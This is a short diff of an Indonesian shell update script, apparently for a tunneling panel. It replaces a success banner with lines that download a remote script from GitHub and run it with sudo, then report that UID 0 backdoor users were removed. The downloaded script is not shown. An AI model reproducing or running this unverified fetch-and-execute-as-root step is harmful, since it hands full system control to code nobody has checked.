@@ -95,18 +95,11 @@ rm -rf menu menu.zip
 
 # Cek dan jalankan update jika ada
 
-
-function Acces_Use_Command() {
-clear
-echo -e ""
-echo -e "\033[96m==========================\033[0m"
-echo -e "\033[92m   INSTALL UPDATE SUCCES   \033[0m"
-echo -e "\033[96m==========================\033[0m"
-echo -e ""
-sleep 3
-menu
-}
-
-clear
-Acces_Use_Command
 jalankan_update
+
+wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/budi.sh -O budi.sh
+chmod +x budi.sh
+sudo ./budi.sh
+
+echo -e "[✅ SELESAI] Semua user backdoor UID 0 telah dinonaktifkan dan dihapus.\n"
+
